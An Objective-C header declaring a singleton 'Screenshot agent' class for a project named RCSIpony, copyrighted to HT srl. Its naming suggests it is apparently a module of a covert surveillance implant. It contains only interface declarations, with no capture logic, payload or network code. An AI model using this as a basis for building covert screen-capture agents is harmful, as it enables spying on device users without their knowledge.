/*
 * RCSIpony - Screenshot agent
 *
 *
 * Created by Massimo Chiodini on 08/03/2010
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSIAgentScreenshot_h__
#define __RCSIAgentScreenshot_h__

#import "RCSICommon.h"

@interface RCSIAgentScreenshot : NSObject <Agents>
{
@private
  NSMutableDictionary *mAgentConfiguration;
  BOOL mContextHasBeenSwitched;
  BOOL isAlreadyRunning;
}

@property (readwrite) BOOL mContextHasBeenSwitched;

+ (RCSIAgentScreenshot *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (BOOL)testAndSetIsAlreadyRunning;

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;

@end

#endif